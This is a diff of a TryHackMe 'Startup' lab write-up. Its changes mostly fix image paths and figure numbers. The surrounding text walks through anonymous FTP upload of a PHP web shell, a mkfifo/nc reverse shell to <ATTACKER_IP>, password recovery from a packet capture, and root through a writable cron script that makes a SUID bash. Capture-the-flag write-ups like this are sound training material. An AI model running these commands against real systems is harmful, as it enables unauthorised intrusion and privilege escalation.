@@ -1,7 +1,7 @@
 # TryHackMe - Startup Writeup
 
 <p align="center">
-  <img src="startup.png" alt="Startup Room" width="700">
+  <img src="images/startup.png" alt="Startup Room" width="700">
 </p>
 
 ## Overview
@@ -20,7 +20,7 @@ nmap -sC -sV <TARGET_IP>
 
 **Figure 1: Nmap scan results**
 
-![Nmap Scan](nmap.jpeg)
+![Nmap Scan](images/nmap.jpeg)
 
 The scan revealed three interesting services:
 
@@ -44,7 +44,7 @@ ftp <TARGET_IP>
 
 **Figure 2: Anonymous FTP Login**
 
-![Anonymous FTP Login](ftp_login.jpeg)
+![Anonymous FTP Login](images/ftp_login.jpeg)
 
 Listing the contents of the FTP server revealed several files and a writable FTP directory.
 
@@ -64,7 +64,7 @@ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt
 
 **Figure 3: Gobuster Enumeration**
 
-![Gobuster Enumeration](gobuster.jpeg)
+![Gobuster Enumeration](images/gobuster.jpeg)
 
 The scan revealed a hidden directory:
 
@@ -76,7 +76,7 @@ Visiting the directory exposed the same files that were accessible through FTP.
 
 **Figure 4: Exposed /files Directory**
 
-![Files Directory](listed_directory_files.jpeg)
+![Files Directory](images/listed_directory_files.jpeg)
 
 This confirmed that files uploaded through FTP could be accessed directly from the web server.
 
@@ -96,11 +96,11 @@ http://<TARGET_IP>/files/ftp/phpbash.php
 
 **Figure 5: Uploaded PHP Web Shell**
 
-![PHP Upload](phpbash_upload.jpeg)
+![PHP Upload](images/phpbash_upload.jpeg)
 
 The page successfully executed commands, confirming remote code execution as the web server user.
 
-![PHP Web Shell](temp_web_shell.jpeg)
+![PHP Web Shell](images/temp_web_shell.jpeg)
 
 ---
 
@@ -122,7 +122,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4242 >/tmp/f
 
 **Figure 6: Reverse Shell Established**
 
-![Reverse Shell](listener.jpeg)
+![Reverse Shell](images/listener.jpeg)
 
 A successful connection was received, providing a shell as the www-data user.
 
@@ -146,7 +146,7 @@ During enumeration, I found 2 interesting items (a directory and a file) was dis
 
 **Figure 7: Discovery of recipe.txt**
 
-![Recipe File](recipe_first_question.jpeg)
+![Recipe File](images/recipe_first_question.jpeg)
 
 The file contained the answer to the first room question.
 
@@ -168,7 +168,7 @@ suspicious.pcapng
 
 **Figure 8: Discovery of suspicious.pcapng**
 
-![Incidents Directory](incident_directory.jpeg)
+![Incidents Directory](images/incident_directory.jpeg)
 
 To retrieve the file, it was moved into the var/www/html/files/ftp directory where it could be downloaded through the web interface.
 
@@ -182,7 +182,7 @@ Inspecting the TCP streams revealed credentials being transmitted.
 
 **Figure 9: Credential Discovery in Wireshark**
 
-![Recovered Credentials](lennie_password.jpeg)
+![Recovered Credentials](images/lennie_password.jpeg)
 
 The capture exposed Lennie's password.
 
@@ -200,7 +200,7 @@ ssh lennie@<TARGET_IP>
 
 **Figure 10: SSH Access as Lennie**
 
-![SSH Access](gaining_ssh_lennie.jpeg)
+![SSH Access](images/gaining_ssh_lennie.jpeg)
 
 After logging in, the user flag was retrieved successfully.
 
@@ -209,7 +209,7 @@ cat user.txt
 ```
 **Figure 11: User Flag Retrieved**  
 
-![User Flag](user_flag.jpeg)
+![User Flag](images/user_flag.jpeg)
 
 ---
 
@@ -219,7 +219,7 @@ cat user.txt
 
 Inside Lennie's home directory, a scripts folder was identified.
 
-![Planner Script](scripts.jpeg)
+![Planner Script](images/scripts.jpeg)
 
 A file named:
 
@@ -237,7 +237,7 @@ echo $LIST > /home/lennie/scripts/startup_list.txt
 /etc/print.sh
 ```
 
-**Figure 11: planner.sh Analysis**
+**Figure 12: planner.sh Analysis**
 
 The script executed `/etc/print.sh`.
 
@@ -249,9 +249,9 @@ This represented a privilege escalation opportunity because the script was execu
 
 ### Exploiting print.sh
 
-**Figure 12: Writable print.sh File**  
+**Figure 13: Writable print.sh File**  
 
-![Privilege Escalation](insecure_file_permissions_vuln.jpeg)
+![Privilege Escalation](images/insecure_file_permissions_vuln.jpeg)
 
 I modified the script to create a SUID-enabled copy of Bash.
 
@@ -268,7 +268,7 @@ After modifying the script, I executed:
 ---
 
 
-**Figure 13: Initial Failure**
+**Figure 14: Initial Failure**
 
 A new binary appeared in `/tmp`.
 
@@ -282,7 +282,7 @@ A new binary appeared in `/tmp`.
 
 The first attempt to execute the binary failed to provide root privileges.
 
-![Failed Root Attempt](without_privilege.jpeg)
+![Failed Root Attempt](images/without_privilege.jpeg)
 
 My first attempt involved executing the SUID bash binary directly. However, this did not provide access to the root flag because Bash dropped its elevated privileges. This behavior is expected in modern versions of Bash as a security measure.
 
@@ -290,7 +290,7 @@ My first attempt involved executing the SUID bash binary directly. However, this
 **Figure 14: Root Shell**
 
 
-![Root Access](root_flag.jpeg)
+![Root Access](images/root_flag.jpeg)
 
 I remembered that Bash requires the -p flag to preserve effective privileges when executed as a SUID binary. Executing the binary with this flag successfully provided a root shell and hell yeahh!! We gained root access
 
